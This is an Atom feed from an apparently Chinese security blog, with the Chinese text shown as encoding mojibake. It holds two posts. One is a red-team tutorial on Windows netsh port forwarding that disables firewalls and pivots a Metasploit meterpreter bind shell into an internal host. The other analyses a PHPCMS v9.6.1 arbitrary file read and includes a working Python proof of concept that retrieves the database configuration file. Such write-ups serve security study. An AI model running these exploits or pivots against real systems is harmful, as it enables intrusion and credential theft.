<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Tao&#39;s Blog</title>
  
  
  <link href="https://taonn.github.io/atom.xml" rel="self"/>
  
  <link href="https://taonn.github.io/"/>
  <updated>2021-04-08T13:26:42.642Z</updated>
  <id>https://taonn.github.io/</id>
  
  <author>
    <name>Bobtaoy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>é…ç½®åŸºäºWindowså†…ç½®å·¥å…·çš„ç«¯å£è½¬å‘</title>
    <link href="https://taonn.github.io/2021/04/08/%E9%85%8D%E7%BD%AE%E5%9F%BA%E4%BA%8EWindows%E5%86%85%E7%BD%AE%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <id>https://taonn.github.io/2021/04/08/%E9%85%8D%E7%BD%AE%E5%9F%BA%E4%BA%8EWindows%E5%86%85%E7%BD%AE%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</id>
    <published>2021-04-08T13:18:37.000Z</published>
    <updated>2021-04-08T13:26:42.642Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åœ¨windowsç³»ç»Ÿä¸­ï¼Œå¯ä»¥ï§ç”¨å†…ç½®çš„<code>netsh</code>å‘½ä»¤æ¥è¿›ï¨ˆç«¯å£è½¬å‘ã€‚ä½¿ç”¨ç«¯å£è½¬å‘è§„åˆ™ï¼Œå¯ä»¥å°†ä¼ å…¥çš„TCPè¿æ¥ï¼ˆIPv4æˆ–IPv6ï¼‰ä»æœ¬åœ°TCPç«¯å£é‡å®šå‘åˆ°ä»»ä½•å…¶ä»–ç«¯å£å·ï¼Œç”šè‡³é‡å®šå‘åˆ°è¿œç¨‹è®¡ç®—æœºä¸Šçš„ç«¯å£ã€‚</p><h2 id="0x01-é˜²ç«å¢™ç®¡ç†"><a href="#0x01-é˜²ç«å¢™ç®¡ç†" class="headerlink" title="0x01 é˜²ç«å¢™ç®¡ç†"></a>0x01 é˜²ç«å¢™ç®¡ç†</h2><p>é¦–å…ˆå…ˆç®€å•çš„äº†è§£ä¸€ä¸‹windowsä¸­å‘½ä»¤è¡Œæ“ä½œé˜²ç«å¢™çš„åŸºæœ¬å‘½ä»¤ã€‚</p><p>åœ¨<strong>win2003ä»¥åŠä¹‹å‰çš„æ“ä½œç³»ç»Ÿ</strong>å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net firewall show state<span class="comment"># æŸ¥çœ‹å½“å‰ç³»ç»Ÿé˜²ç«å¢™çŠ¶æ€</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net firewall <span class="built_in">set</span> opmode disable <span class="comment"># å…³é—­å½“å‰ç³»ç»Ÿé˜²ç«å¢™</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net firewall <span class="built_in">set</span> opmode enable <span class="comment"># å¯ç”¨å½“å‰ç³»ç»Ÿé˜²ç«å¢™</span></span><br></pre></td></tr></table></figure><p>ç«¯å£ç®¡ç†</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall add portopening TCP <span class="number">80</span> <span class="string">&quot;Open Port 80&quot;</span><span class="comment"># å¯ç”¨80ç«¯å£</span></span><br><span class="line">netsh firewall delete portopening protocol=TCP port=<span class="number">80</span> <span class="comment"># åˆ é™¤å¯ç”¨çš„ç«¯å£ç­–ç•¥</span></span><br></pre></td></tr></table></figure><p><strong>Win2003ä¹‹åçš„ç³»ç»Ÿ</strong>ï¼ˆè™½å·²å¼ƒç”¨ï¼Œä½†è¿˜æ˜¯å¯ï¼‰</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show allprofiles<span class="comment"># æŸ¥çœ‹å½“å‰ç³»ç»Ÿæ‰€æœ‰ç½‘ç»œç±»å‹çš„é˜²ç«å¢™çŠ¶æ€,æ¯”å¦‚,ç§æœ‰,å…¬å…±,åŸŸç½‘ç»œ</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> currentprofile state off<span class="comment"># å…³é—­å½“å‰ç³»ç»Ÿé˜²ç«å¢™</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> currentprofile state on<span class="comment"># å¯ç”¨å½“å‰ç³»ç»Ÿé˜²ç«å¢™</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall reset<span class="comment"># é‡ç½®å½“å‰ç³»ç»Ÿæ‰€æœ‰çš„é˜²ç«å¢™è§„åˆ™</span></span><br></pre></td></tr></table></figure><p>ç«¯å£ç®¡ç†</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name= <span class="string">&quot;Open Port 80&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">80</span><span class="comment"># å¯ç”¨80ç«¯å£</span></span><br><span class="line">netsh advfirewall firewall delete rule name=<span class="string">&quot;Open Port 80&quot;</span> name protocol=TCP localport=<span class="number">80</span><span class="comment"># åˆ é™¤å¯ç”¨80ç«¯å£çš„ç­–ç•¥</span></span><br></pre></td></tr></table></figure><blockquote><p>æ›´å¤šå‘½ä»¤è¯¦è§£å‚è€ƒï¼š<a href="https://docs.microsoft.com/zh-CN/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior">ä½¿ç”¨ netsh advfirewall é˜²ç«å¢™è€Œä¸æ˜¯ netsh é˜²ç«å¢™æ§åˆ¶ Windows é˜²ç«å¢™è¡Œä¸º</a></p></blockquote><h2 id="0x02-åŸºç¡€å‘½ä»¤"><a href="#0x02-åŸºç¡€å‘½ä»¤" class="headerlink" title="0x02 åŸºç¡€å‘½ä»¤"></a>0x02 åŸºç¡€å‘½ä»¤</h2><p>ä½¿ç”¨Netshå‘½ä»¤ä¸­portproxyæ¨¡å¼å³å¯å®ç°windowsç³»ç»Ÿçš„ç«¯å£è½¬å‘ï¼Œè½¬å‘å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport</span><br></pre></td></tr></table></figure><ul><li><code>listenaddress</code>â€”-&gt;ç­‰å¾…è¿æ¥çš„æœ¬åœ°IPåœ°å€</li><li><code>listenport</code>â€”-&gt; æœ¬åœ°ç›‘å¬çš„TCPç«¯å£(ç­‰å¾…è¿æ¥)</li><li><code>connectaddress</code>â€”-&gt; è¢«è½¬å‘çš„è¿œç¨‹IPåœ°å€</li><li><code>connectport</code>â€”-&gt;è¢«è½¬å‘çš„è¿œç¨‹ç«¯å£</li></ul><h2 id="0x04-æœ¬åœ°è½¬å‘"><a href="#0x04-æœ¬åœ°è½¬å‘" class="headerlink" title="0x04 æœ¬åœ°è½¬å‘"></a>0x04 æœ¬åœ°è½¬å‘</h2><h3 id="ç¯å¢ƒè¯´æ˜"><a href="#ç¯å¢ƒè¯´æ˜" class="headerlink" title="ç¯å¢ƒè¯´æ˜"></a>ç¯å¢ƒè¯´æ˜</h3><blockquote><p>Win7: <font color="red">1.1.1.13</font></p></blockquote><h3 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><p>å°†æœ¬åœ°çš„RDPæœåŠ¡ï¼ˆè¿œç¨‹åè®®ï¼‰3389ç«¯å£è½¬å‘åˆ°æœ¬æœºçš„3333ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress&#x3D;1.1.1.13 listenport&#x3D;3333 connectaddress&#x3D;1.1.1.13 connectport&#x3D;3389</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨å»ºç«‹ä¸Šé¢çš„è§„åˆ™ä¹‹å‰ï¼Œéœ€è¦ä¿è¯ç›‘å¬ç«¯å£æ²¡ç”¨è¢«ä»»ä½•ç¨‹åºå ç”¨ã€‚</p></blockquote><p>æ£€æŸ¥ç«¯å£æ˜¯å¦è¢«å ç”¨</p><ul><li><code>netstat -ano | findstr 3333</code><ul><li><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210408164100782.png" alt="image-20210408164100782"></li></ul></li><li><code>Test-NetConnection -ComputerName localhost -Port 3333</code><ul><li><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210408164527490.png" alt="image-20210408164527490"></li></ul></li></ul><p>æŸ¥è¯¢ç«¯å£è½¬å‘ç­–ç•¥<code>netsh interface portproxy show all</code></p><p>è¿æ¥æµ‹è¯•</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210408164931837.png" alt="image-20210408164931837"></p><h2 id="0x04-è¿œç¨‹è½¬å‘"><a href="#0x04-è¿œç¨‹è½¬å‘" class="headerlink" title="0x04 è¿œç¨‹è½¬å‘"></a>0x04 è¿œç¨‹è½¬å‘</h2><p>ç”±äºæœ¬åœ°è½¬å‘åªæ˜¯åœ¨æœ¬æœºè¿›è¡Œç›‘å¬ï¼Œè¿œç¨‹çš„è®¡ç®—æœºæ— æ³•è¿›è¡Œè¿æ¥ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦ç›‘å¬åœ¨<code>0.0.0.0</code>ï¼Œå®ç°è¿œç¨‹ä»»æ„ä¸»æœºå¯è¿æ¥çš„ç«¯å£è½¬å‘ã€‚çœ‹ä¸‹é¢å®ä¾‹å§ã€‚</p><h3 id="ç¯å¢ƒè¯´æ˜-1"><a href="#ç¯å¢ƒè¯´æ˜-1" class="headerlink" title="ç¯å¢ƒè¯´æ˜"></a>ç¯å¢ƒè¯´æ˜</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Win10æ”»å‡»æœº:<span class="number">1.1</span>.<span class="number">1.1</span></span><br><span class="line">ç›®æ ‡è¾¹ç•ŒWindows <span class="number">2012</span> Server(å¯å‡ºç½‘): <span class="number">1.1</span>.<span class="number">1.14</span></span><br><span class="line">ç›®æ ‡å†…ç½‘Win7: <span class="number">1.1</span>.<span class="number">1.13</span></span><br></pre></td></tr></table></figure><p>ç®€å•çš„ç½‘ç»œæ‹“æ‰‘å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210408210655021.png" alt="image-20210408210655021"></p><h3 id="Metasploitä¸Šçº¿"><a href="#Metasploitä¸Šçº¿" class="headerlink" title="Metasploitä¸Šçº¿"></a>Metasploitä¸Šçº¿</h3><p>é€šè¿‡å‡ºç½‘çš„è¾¹ç•Œ<code>windows 2012 server</code>æŠŠå†…ç½‘<code>Win7</code>é€šè¿‡payloadä¸Šçº¿åˆ°<code>Win10æ”»å‡»æœº</code>çš„Metasploitä¸Šã€‚</p><p>åœ¨<code>windows 2012</code>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name= <span class="string">&quot;meta-online&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">5353</span><span class="comment"># é…ç½®å¼€å¯5353ç«¯å£ç­–ç•¥</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenport=<span class="number">5353</span> connectaddress=<span class="number">1.1</span>.<span class="number">1.13</span> connectport=<span class="number">53</span><span class="comment"># ç«¯å£è½¬å‘ï¼š5353---&gt;1.1.1.13:53</span></span><br></pre></td></tr></table></figure><p>msfç”Ÿæˆæ­£å‘è¿æ¥çš„payloadï¼Œåœ¨ä¸å‡ºç½‘çš„<code>Win7</code>ä¸Šæ‰§è¡Œ</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/bind_tcp LPORT=<span class="number">53</span> AHOST=<span class="number">1.1</span>.<span class="number">1.13</span> <span class="operator">-f</span> exe &gt; tao.exe<span class="comment"># ahostä¸ºå…è®¸è®¿é—®çš„æœºå™¨ï¼ˆWin7ï¼‰</span></span><br></pre></td></tr></table></figure><p>æœ€åï¼Œåœ¨<code>Win10 æ”»å‡»æœº</code>å¯åŠ¨metasploitç›‘å¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo msfconsole -q</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> RHOST 1.1.1.14</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 5353</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> AHOST 1.1.1.13</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit -j</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210408174339366.png" alt="image-20210408174339366"></p><p>æˆåŠŸä¸Šçº¿ï¼</p><p>åˆ©ç”¨å®Œåï¼Œå¦‚éœ€åˆ é™¤è§„åˆ™ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall delete rule name=<span class="string">&quot;meta-online&quot;</span> name protocol=TCP localport=<span class="number">5353</span><span class="comment"># åˆ é™¤å¯ç”¨5353é˜²ç«å¢™ç­–ç•¥</span></span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=<span class="number">5353</span> <span class="comment"># åˆ é™¤ç«¯å£è½¬å‘</span></span><br></pre></td></tr></table></figure><h2 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h2><p>åœ¨Windows 2003/XPä¸­ï¼Œä½ å¿…é¡»åœ¨æ³¨å†Œè¡¨<code>HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters</code>ä¸­æ‰¾åˆ°å¹¶è®¾ç½®<code>IPEnableRouter</code>å‚æ•°ä¸º1æ‰èƒ½å®ç°ç«¯å£è½¬å‘</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="http://woshub.com/port-forwarding-in-windows/">Configuring Port Forwarding on Windows</a></li><li><a href="https://xz.aliyun.com/t/2068">ä½¿ç”¨Windowså‘½ä»¤æ¥å®ç°ç«¯å£è½¬å‘</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;åœ¨windowsç³»ç»Ÿä¸­ï¼Œå¯ä»¥ï§ç”¨å†…ç½®çš„&lt;code&gt;netsh&lt;/code&gt;å‘½ä»¤æ¥è¿›ï¨ˆç«¯å£è½¬å‘ã€‚ä½¿ç”¨ç«¯</summary>
      
    
    
    
    <category term="Red team" scheme="https://taonn.github.io/categories/Red-team/"/>
    
    
    <category term="ç«¯å£è½¬å‘" scheme="https://taonn.github.io/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>ä»£ç å®¡è®¡ä¹‹PHPCMS v9.6.1 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æ</title>
    <link href="https://taonn.github.io/2021/02/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS-v9-6-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://taonn.github.io/2021/02/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS-v9-6-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-02-10T08:21:17.000Z</published>
    <updated>2021-03-16T05:30:13.484Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¸ªç‰ˆæœ¬ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å’Œä¸Šä¸€ç¯‡åˆ†æçš„<a href="https://bobtaoy.github.io/2021/02/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS%20v9.6.0%20wap%E6%A8%A1%E5%9D%97SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">wapSQLæ³¨å…¥æ¼æ´</a>åŸç†æ˜¯ç±»ä¼¼çš„ï¼Œä¸”å‡ºç°æ¼æ´çš„åŸå› éƒ½æ˜¯åœ¨<code>phpcms/modules/content/down.php</code>æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™æ¬¡ç›´æ¥å¯¹payloadä¸­çš„å·§å¦™ç‚¹è¿›è¡Œåˆ†æ</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æ‰‹åŠ¨åˆ©ç”¨è·Ÿä¸Šç¯‡wapçš„sqlæ³¨å…¥å·®ä¸å¤šï¼Œè¿™æ¬¡æˆ‘ä»¬ç›´æ¥ä¸Špocè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Author: Tao</span></span><br><span class="line"><span class="string">version: python3</span></span><br><span class="line"><span class="string"># æœ¬è„šæœ¬è¯»å–çš„æ˜¯æ•°æ®åº“é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">down</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment"># step1</span></span><br><span class="line">    url_one = url + <span class="string">&#x27;/index.php?m=wap&amp;c=index&amp;siteid=1&#x27;</span></span><br><span class="line">    step1 = requests.get(url_one)</span><br><span class="line">    userid_flash = step1.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># step2</span></span><br><span class="line">    url_two = url + <span class="string">&#x27;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3D./caches/configs/database%26f%3D.p%25253chp&#x27;</span><span class="comment"># è¯»ä»»æ„æ–‡ä»¶è¿™é‡Œä¿®æ”¹</span></span><br><span class="line">    step2 = requests.post(url_two, data=&#123;<span class="string">&#x27;userid_flash&#x27;</span>: userid_flash&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> cookie <span class="keyword">in</span> step2.cookies:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;_att_json&#x27;</span> <span class="keyword">in</span> cookie.name:</span><br><span class="line">            att_json = cookie.value</span><br><span class="line"></span><br><span class="line">    url_three = url + <span class="string">&#x27;/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=&#x27;</span> + att_json</span><br><span class="line">    <span class="keyword">return</span> url_three</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    downurl = down(url)</span><br><span class="line">    print(downurl)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210210150123574.png" alt="image-20210210150123574"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>â€‹    æˆ‘åœ¨åˆ†æè¿™ä¸ªæ¼æ´ï¼ŒæŸ¥èµ„æ–™çš„æ—¶å€™ï¼Œå‘ç°äº†çº¢æ—¥å®‰å…¨å›¢é˜Ÿä¸ƒæœˆç«ä¹Ÿå†™æœ‰è¿™ä¸ªæ¼æ´çš„åˆ†ææ–‡ç« ï¼Œä»–å†™çš„éå¸¸è¯¦ç»†ï¼Œä½ ä»¬å¦‚æœçœ‹ä¸æ‡‚æˆ‘å†™çš„ï¼Œå¯ä»¥å»çœ‹ä»–çš„<a href="https://xz.aliyun.com/t/5731">PHPCMSæ¼æ´åˆ†æåˆé›†(ä¸‹)</a>  ï¼ˆæˆ‘æ¯”è¾ƒèœï¼ï¼‰</p><p>â€‹    é¦–å…ˆè®¿é—®è„šæœ¬è¿”å›çš„urlï¼Œè°ƒè¯•åˆ†æä¸€ä¸‹<code>phpcms/modules/content/down.php</code>ä¸­<code>init</code>å‡½æ•°</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210210153731495.png" alt="image-20210210153731495"></p><p>17è¡Œ<code>safe_replace</code>å‡½æ•°è¿›è¡Œè¿‡æ»¤ï¼Œä½†æ˜¯å¯¹æˆ‘ä»¬ä¼ è¿›å»çš„å€¼æ²¡æœ‰å½±å“ã€‚18è¡Œ<code>parse_str</code>å‡½æ•°è§£ææ³¨å†Œå˜é‡ï¼Œå°†<code>$f=%253chp</code> =&gt; å¯¹å…¶è¿›è¡Œä¸€æ¬¡urlè§£ç ä¸º<code>%3cph</code>(è¿™é‡Œå› ä¸º<code>%25 = %</code>)ï¼Œç»§ç»­å¾€ä¸‹èµ°ï¼Œåˆ°76è¡Œ</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210210153942469.png" alt="image-20210210153942469"></p><p>76-77è¡Œå¯¹fçš„å€¼è¿›è¡Œäº†æ£€æŸ¥ï¼Œç„¶å79è¡Œè¿›è¡Œäº†åŠ å¯†ï¼Œè¿™é‡Œä¸ä¸Šç¯‡<a href="https://bobtaoy.github.io/2021/02/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS%20v9.6.0%20wap%E6%A8%A1%E5%9D%97SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">wap sqlæ³¨å…¥åˆ†æ</a>ç±»ä¼¼ï¼Œä½†æ˜¯ä¸åŒçš„æ˜¯è¿™é‡ŒåŠ è§£å¯†çš„ <code>key</code> å˜æˆäº† <code>$pc_auth_key</code>,80è¡Œè¿”å›æˆ‘ä»¬ä¸‹è½½çš„url, ä¼šè°ƒç”¨åŒæ–‡ä»¶ä¸­çš„<code>download</code>å‡½æ•°</p><p>æˆ‘ä»¬ç‚¹å‡»ä¸‹è½½ï¼Œä¸‹æ–­ç‚¹åˆ°88è¡Œï¼Œåˆ†æ<code>download</code>å‡½æ•°</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210210154927253.png" alt="image-20210210154927253"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210210155037726.png" alt="image-20210210155037726"></p><p>90è¡Œå¯¹ä¸Šé¢åŠ å¯†çš„å€¼è¿›è¡Œè§£å¯†ï¼Œç„¶å94è¡Œå†ä¸€æ¬¡è§£ææ³¨å†Œå˜é‡ï¼Œæ­¤æ—¶å°†<code>%3c</code>è¿›è¡Œè§£ç ä¸º<code>&lt;</code>,æ‰€ä»¥<code>$f=.p&lt;hp</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210210155456290.png" alt="image-20210210155456290"></p><p>103ç»•è¿‡äº†æ£€æŸ¥ï¼Œ108æ‹¼æ¥ï¼Œç»„æˆäº†æˆ‘ä»¬æƒ³è¦ä¸‹è½½çš„phpæ–‡ä»¶ï¼ˆæ–‡ä»¶åè¿˜æ²¡å®Œå…¨å¯¹ï¼‰</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210210155734267.png" alt="image-20210210155734267"></p><p>åˆ°è¿™ä¸€æ­¥ï¼Œ126è¡Œå°±æ˜¯äº§ç”Ÿæ¼æ´çš„ä¸»è¦åŸå› ï¼Œä¹Ÿå¾ˆå¥½çš„è§£é‡Šäº†ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¼ è¿›å»çš„å€¼æœ‰<code>&lt;</code></p><p>ä¸€æ¬¡ <code>str_replace(array(&#39;&lt;&#39;,&#39;&gt;&#39;), &#39;&#39;,$fileurl)</code>, æ¶ˆå»<code>&lt;</code>, é€ æˆäº†ä»»æ„æ–‡ä»¶çš„ä¸‹è½½</p><p>è¿™æ•´ä¸ªåˆ†æè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¼ è¿›å»çš„payloadä¼šç»è¿‡ä¸¤æ¬¡<code>safe_replace</code> ã€ä¸¤æ¬¡ <code>parse_str</code>,ä¸€æ¬¡ <code>str_replace(array(&#39;&lt;&#39;,&#39;&gt;&#39;), &#39;&#39;,$fileurl)</code>è€Œç¨‹åºå¯¹ <code>..</code> å’Œ <code>php</code> å­—ç¬¦è¿›è¡Œäº†æ£€æµ‹ã€‚æ‰€ä»¥æˆ‘ä»¬è¦æƒ³è®¿é—® <code>php</code>æ–‡ä»¶æˆ–è¿›è¡Œè·¯å¾„ç©¿è¶Šï¼Œåç¼€å¯ä»¥è®¾ç½®æˆ <code>ph&gt;p</code> ï¼Œè·¯å¾„ç¬¦å¯ä»¥å˜æˆ <code>.&gt;.</code> ã€‚ä½†æ˜¯ <code>safe_replace</code> å‡½æ•°ä¼š <code>str_replace(&#39;&gt;&#39;,&#39;&gt;&#39;,$string)</code> ï¼Œæ‰€ä»¥ <strong>&gt;</strong> å­—ç¬¦éœ€è¦ç¼–ç ä¸¤æ¬¡ï¼Œå˜æˆ <code>%25253e</code> </p><p>æœ€åè´´ä¸€å¼ ä¸ƒæœˆç«å¸ˆå‚…çš„è§¦å‘è¿‡ç¨‹æ•´ç†å›¾ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/phpcms9-6-1sum.png" alt="img"></p><blockquote><p>æ¥æºï¼šçº¢æ—¥å®‰å…¨å›¢é˜Ÿä¸ƒæœˆç«</p></blockquote><h2 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h2><ul><li><a href="https://xz.aliyun.com/t/5731">https://xz.aliyun.com/t/5731</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™ä¸ªç‰ˆæœ¬ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å’Œä¸Šä¸€ç¯‡åˆ†æçš„&lt;a href=&quot;https://bobtaoy.github.io/2021/02/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS%20v9.6.0%20wap%E6%A8</summary>
      
    
    
    
